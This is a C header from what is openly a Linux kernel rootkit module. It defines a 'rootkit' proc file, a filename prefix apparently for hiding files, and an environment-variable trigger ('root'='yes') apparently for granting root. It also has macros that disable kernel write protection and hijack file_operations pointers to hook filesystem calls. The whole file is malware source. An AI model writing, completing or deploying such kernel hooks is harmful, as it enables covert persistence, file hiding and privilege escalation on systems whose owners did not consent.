#ifndef __COMMON_H
#define __COMMON_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/random.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>

#include "misc.h"

#define PROCFILE_NAME "rootkit"
#define HIDE_PREFIX "rk_file_"

#define ENV_VAR "root"
#define ENV_PASS "yes"

#define MIN(a, b)               \
    ({                          \
        __typeof__(a) _a = (a); \
        __typeof__(b) _b = (b); \
        _a < _b ? _a : _b;      \
    })

#define SET_FOP(op, file_path, new, old)                    \
    do                                                      \
    {                                                       \
        struct inode *inode;                                \
        struct path path;                                   \
        if (kern_path(file_path, 0, &path))                 \
            return -1;                                      \
        inode = path.dentry->d_inode;                       \
        old = inode->i_fop->op;                             \
        disable_write_protect();                            \
        ((struct file_operations *)inode->i_fop)->op = new; \
        enable_write_protect();                             \
    } while (0)

#define UNSET_FOP(op, file_path, new)      \
    do                                     \
    {                                      \
        void *null;                        \
        SET_FOP(op, file_path, new, null); \
    } while (0)

#endif